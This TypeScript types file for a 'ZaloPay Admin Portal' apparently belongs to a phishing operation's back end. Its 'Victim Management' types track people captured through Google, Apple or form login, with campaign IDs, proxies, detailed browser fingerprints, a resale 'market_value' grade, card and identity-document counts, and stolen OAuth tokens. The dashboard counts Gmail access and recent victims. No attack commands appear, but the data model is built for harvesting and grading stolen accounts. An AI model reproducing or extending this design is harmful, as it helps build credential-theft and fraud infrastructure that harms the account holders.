// Shared types for ZaloPay Admin Portal

export interface User {
  id: number;
  username: string;
  email: string;
  is_superuser: boolean;
  is_active: boolean;
  created_at: string;
  last_login?: string;
  permissions?: string[];
  role?: string;
}

export interface PartnerRegistration {
  id: number;
  business_name: string;
  business_type: string;
  industry: string;
  tax_code?: string;
  business_license?: string;
  business_address: string;
  business_phone: string;
  business_email: string;
  website?: string;
  representative_name: string;
  representative_phone: string;
  representative_email: string;
  representative_id_number: string;
  representative_position?: string;
  bank_name: string;
  bank_account_number: string;
  bank_account_name: string;
  bank_branch?: string;
  status: 'pending' | 'under_review' | 'approved' | 'rejected';
  registered_at: string;
  reviewed_at?: string;
  reviewed_by?: number;
  reviewer?: string;
  notes?: string;
  uploaded_files?: UploadedFile[];
}

export interface AccountVerification {
  id: number;
  partner_id: number;
  email_type: 'business' | 'personal';
  verification_type: string;
  description?: string;
  status: 'pending' | 'under_review' | 'approved' | 'rejected';
  submitted_at: string;
  reviewed_at?: string;
  reviewed_by?: number;
  notes?: string;
  partner?: PartnerRegistration;
}

export interface Transaction {
  id: number;
  transaction_id: string;
  partner_id: number;
  amount: number;
  currency: string;
  transaction_type: 'payment' | 'refund' | 'withdrawal';
  status: 'pending' | 'completed' | 'failed' | 'cancelled';
  description?: string;
  payment_method?: string;
  created_at: string;
  completed_at?: string;
  partner?: PartnerRegistration;
}

export interface UploadedFile {
  id: number;
  filename: string;
  original_filename: string;
  file_path: string;
  file_type: string;
  file_size: number;
  registration_id?: number;
  verification_id?: number;
  uploaded_at: string;
}

export interface AuditLog {
  id: number;
  user_id: number;
  action: string;
  resource_type: string;
  resource_id?: number;
  details?: string;
  ip_address?: string;
  user_agent?: string;
  created_at: string;
  user?: User;
  // Extended activity log metadata (optional, aligned with backend activityLog model)
  actionType?: string;
  actionCategory?: string;
  severityLevel?: string;
  actor?: Record<string, any>;
  target?: Record<string, any>;
  actionDetails?: Record<string, any>;
  technicalContext?: Record<string, any>;
}

export interface DashboardStats {
  total_registrations: number;
  pending_registrations: number;
  approved_registrations: number;
  total_verifications: number;
  pending_verifications: number;
  total_transactions: number;
  total_transaction_amount: number;
  active_users: number;
  total_gmail_access?: number;
  recent_victims?: Victim[];
}

export interface PaginatedResponse<T> {
  items: T[];
  total: number;
  pages: number;
  current_page: number;
  per_page: number;
}

export interface FilterOptions {
  page?: number;
  per_page?: number;
  status?: string;
  industry?: string;
  search?: string;
  partner_id?: number;
  type?: string;
  email_type?: string;
}

export interface ApiResponse<T = any> {
  success: boolean;
  message?: string;
  data?: T;
  error?: string;
}

export interface LoginResponse {
  success: boolean;
  token: string;
  user: User;
}

// Victim Management Types
export interface Victim {
  id: string;
  email: string;
  name?: string;
  phone?: string;
  capture_timestamp: string;
  campaign_id?: string;
  campaign?: Campaign;
  capture_method: 'oauth_google' | 'oauth_apple' | 'form_direct';
  capture_source?: string;
  session_data: {
    session_id?: string;
    ip_address?: string;
    user_agent?: string;
    referrer?: string;
    utm_parameters?: {
      utm_source?: string;
      utm_medium?: string;
      utm_campaign?: string;
      utm_content?: string;
    };
    proxy_used?: {
      proxy_url?: string;
      proxy_type?: string;
      country?: string;
      provider?: string;
    };
  };
  device_fingerprint: {
    fingerprint_id?: string;
    screen_resolution?: string;
    color_depth?: number;
    timezone?: string;
    language?: string;
    platform?: string;
    plugins?: string[];
    fonts?: string[];
    canvas_signature?: string;
    webgl_vendor?: string;
    webgl_renderer?: string;
    audio_fingerprint?: string;
  };
  validation: {
    status?: 'pending_validation' | 'validated' | 'invalid';
    market_value?: 'low' | 'medium' | 'high' | 'premium';
    account_type?: string;
    risk_score?: number;
  };
  risk_assessment?: {
    risk_level?: 'low' | 'medium' | 'high';
    risk_factors?: string[];
  };
  card_information?: {
    cards_count?: number;
    has_cards?: boolean;
  };
  identity_verification?: {
    verification_status?: string;
    documents_count?: number;
  };
  created_at: string;
  updated_at: string;
  is_active: boolean;
  hasOAuthTokens?: boolean;
  oauthTokensCount?: number;
  hasCardInfo?: boolean;
  hasIdentityVerification?: boolean;
  registrationCompleted?: boolean;
}

export interface OAuthToken {
  id: string;
  victim_id: string;
  provider: 'google' | 'apple';
  token_status: 'active' | 'expired' | 'revoked' | 'invalid';
  issued_at: string;
  expires_at: string;
  last_refreshed?: string;
  refresh_count: number;
  user_profile?: {
    email?: string;
    name?: string;
    picture?: string;
  };
  provider_metadata?: {
    scopes?: string[];
  };
}

export interface Campaign {
  id: string;
  name: string;
  description?: string;
  status: 'active' | 'paused' | 'completed' | 'archived';
  created_at: string;
  start_date?: string;
  end_date?: string;
}
